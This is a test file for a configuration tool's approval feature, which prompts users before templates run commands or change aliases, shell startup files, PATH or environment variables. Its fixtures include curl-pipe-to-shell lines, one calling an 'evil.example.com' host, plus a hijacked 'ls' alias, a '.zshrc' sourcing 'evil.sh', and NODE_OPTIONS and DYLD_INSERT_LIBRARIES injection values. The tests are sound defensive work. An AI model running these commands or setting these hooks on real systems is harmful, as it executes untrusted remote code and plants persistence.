import * as fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

import { MockReporter } from '../../test/orchestrator/mocks/reporter.js';
import { TemplateCommandsDeclinedError } from '../common/errors.js';
import { Project } from '../entities/project.js';
import { FileType, InMemoryFile } from '../parser/entities.js';
import { CodifyParser } from '../parser/index.js';
import { JsonReporter } from '../ui/reporters/json-reporter.js';
import { StubReporter } from '../ui/reporters/stub-reporter.js';
import { formatTemplateCommandApproval } from '../ui/template-command-formatter.js';
import { approvalReason, TemplateCommandApproval, TemplateCommandApprovalRequest } from './template-command-approval.js';
import { TemplateExpander } from './template-expander.js';

async function expand(configs: unknown[], templates: Record<string, string>): Promise<Project> {
  const project = await CodifyParser.parseJson(configs as never);
  await new TemplateExpander({
    async load(template): Promise<InMemoryFile> {
      return { contents: templates[template.source], filePath: `template:${template.source}`, fileType: FileType.JSONC };
    }
  }).expand(project);
  return project;
}

const TEMPLATES = {
  tools: '[{ "type": "action", "condition": "command -v tool", "action": "curl -fsSL https://example.com | sh", "requiresRoot": true }, { "type": "nvm" }]',
};

describe('TemplateCommandApproval', () => {
  let storePath: string;

  beforeEach(async () => {
    storePath = path.join(await fs.mkdtemp(path.join(os.tmpdir(), 'codify-approval-')), 'approvals.json');
  });

  afterEach(async () => {
    await fs.rm(path.dirname(storePath), { recursive: true, force: true });
  });

  it('asks the user to approve actions from templates and remembers the approval', async () => {
    const project = await expand([{ type: 'template', source: 'tools' }], TEMPLATES);
    const prompt = vi.fn((_requests: TemplateCommandApprovalRequest[]) => true);

    await TemplateCommandApproval.ensureApproved(project, new MockReporter({ promptTemplateCommandApproval: prompt }), { storePath });

    expect(prompt).toHaveBeenCalledTimes(1);
    expect(prompt.mock.calls[0][0]).toEqual([{
      resourceId: 'action',
      templates: ['tools'],
      parameters: [
        { name: 'condition', value: 'command -v tool' },
        { name: 'action', value: 'curl -fsSL https://example.com | sh' },
        { name: 'requiresRoot', value: true },
      ],
    }]);

    // Approved before: not asked again
    const secondRun = await expand([{ type: 'template', source: 'tools' }], TEMPLATES);
    await TemplateCommandApproval.ensureApproved(secondRun, new MockReporter({ promptTemplateCommandApproval: prompt }), { storePath });
    expect(prompt).toHaveBeenCalledTimes(1);

    // The command changed: asked again
    const changed = await expand([{ type: 'template', source: 'tools' }], {
      tools: '[{ "type": "action", "action": "curl -fsSL https://evil.example.com | sh" }]',
    });
    await TemplateCommandApproval.ensureApproved(changed, new MockReporter({ promptTemplateCommandApproval: prompt }), { storePath });
    expect(prompt).toHaveBeenCalledTimes(2);
  });

  it('stops the run when the user declines', async () => {
    const project = await expand([{ type: 'template', source: 'tools' }], TEMPLATES);

    await expect(TemplateCommandApproval.ensureApproved(project, new MockReporter({ promptTemplateCommandApproval: () => false }), { storePath }))
      .rejects.toThrow(TemplateCommandsDeclinedError);
    await expect(fs.access(storePath)).rejects.toThrow();
  });

  it('does not ask for actions the user declared', async () => {
    const prompt = vi.fn(() => true);
    const project = await expand([
      { type: 'action', action: 'echo mine' },
    ], {});

    await TemplateCommandApproval.ensureApproved(project, new MockReporter({ promptTemplateCommandApproval: prompt }), { storePath });

    // Merged with a template resource: still declared by the user
    const merged = await expand([{ type: 'template', source: 'tools' }], TEMPLATES);
    const action = merged.findSpecific('action')!;
    action.origins.push({ templates: [] });
    await TemplateCommandApproval.ensureApproved(merged, new MockReporter({ promptTemplateCommandApproval: prompt }), { storePath });

    expect(prompt).not.toHaveBeenCalled();
  });

  it('approves everything with --auto-approve-all', async () => {
    const prompt = vi.fn(() => false);
    const project = await expand([{ type: 'template', source: 'tools' }], TEMPLATES);

    await TemplateCommandApproval.ensureApproved(project, new MockReporter({ promptTemplateCommandApproval: prompt }), { storePath, autoApproveAll: true });
    expect(prompt).not.toHaveBeenCalled();
  });

  it('never approves automatically in non interactive reporters', async () => {
    const project = await expand([{ type: 'template', source: 'tools' }], TEMPLATES);

    await expect(TemplateCommandApproval.ensureApproved(project, new JsonReporter(), { storePath }))
      .rejects.toThrow(/--auto-approve-all/);
    await expect(TemplateCommandApproval.ensureApproved(project, new StubReporter(), { storePath }))
      .rejects.toThrow(TemplateCommandsDeclinedError);
  });

  it('formats the commands for the user', () => {
    const message = formatTemplateCommandApproval([{
      resourceId: 'action',
      templates: ['@codify/tools'],
      parameters: [{ name: 'action', value: 'make install' }, { name: 'requiresRoot', value: true }],
    }]);

    expect(message).toContain('action');
    expect(message).toContain('@codify/tools');
    expect(message).toContain('make install');
    expect(message).toContain('runs with sudo');
  });

  it('asks for other resources that can make code run later', async () => {
    const project = await expand([{ type: 'template', source: 'dotfiles' }], {
      dotfiles: JSON.stringify([
        { type: 'alias', alias: 'ls', value: 'curl https://example.com | sh' },
        { type: 'file', path: '~/.zshrc', contents: 'source ~/evil.sh' },
        { type: 'path', path: '/tmp/bin', prepend: true },
        { type: 'env-var', variable: 'NODE_OPTIONS', value: '--require /tmp/x.js' },
        { type: 'env-var', name: 'java', variable: 'JAVA_HOME', value: '/opt/java' },
        { type: 'nvm' },
      ]),
    });

    const prompt = vi.fn((_requests: TemplateCommandApprovalRequest[]) => true);
    await TemplateCommandApproval.ensureApproved(project, new MockReporter({ promptTemplateCommandApproval: prompt }), { storePath });

    const requests = prompt.mock.calls[0][0];
    expect(requests.map((r) => r.resourceId).sort()).toEqual(['alias', 'env-var', 'file', 'path'].sort());
    expect(requests.find((r) => r.resourceId === 'env-var')?.reason).toContain('NODE_OPTIONS');
    expect(requests.find((r) => r.resourceId === 'file')?.parameters).toEqual([
      { name: 'contents', value: 'source ~/evil.sh' },
      { name: 'path', value: '~/.zshrc' },
    ]);
  });

  it('explains why each change needs approval', () => {
    const make = (type: string, parameters: Record<string, unknown>) => ({ type, parameters }) as never;

    expect(approvalReason(make('action', { action: 'x' }))).toBe('Runs a command');
    expect(approvalReason(make('github-cli-alias', { shell: true }))).toContain('shell command');
    expect(approvalReason(make('ssh-config', {}))).toContain('SSH');
    expect(approvalReason(make('env-vars', { vars: [{ variable: 'PATH', value: '/x' }, { variable: 'HOME_DIR', value: '/y' }] }))).toBe('Sets PATH, which changes how programs run');
    expect(approvalReason(make('env-var', { variable: 'DYLD_INSERT_LIBRARIES', value: '/tmp/x.dylib' }))).toContain('DYLD_INSERT_LIBRARIES');
    expect(approvalReason(make('env-var', { variable: 'JAVA_HOME', value: '/opt' }))).toBeNull();
    expect(approvalReason(make('env-file', { contents: [{ key: 'LD_PRELOAD', value: 'x' }] }))).toBeNull();
    expect(approvalReason(make('homebrew', { formulae: ['jq'] }))).toBeNull();
  });

  it('formats changes that are not commands', () => {
    const message = formatTemplateCommandApproval([{
      resourceId: 'file',
      templates: ['@someone/dotfiles'],
      reason: 'Writes a file on your machine',
      parameters: [{ name: 'path', value: '~/.zshrc' }],
    }]);

    expect(message).toContain('a change that needs your approval');
    expect(message).toContain('Writes a file on your machine');
    expect(message).toContain('Allow these changes?');
    expect(message).not.toContain('condition of an action');
  });
});
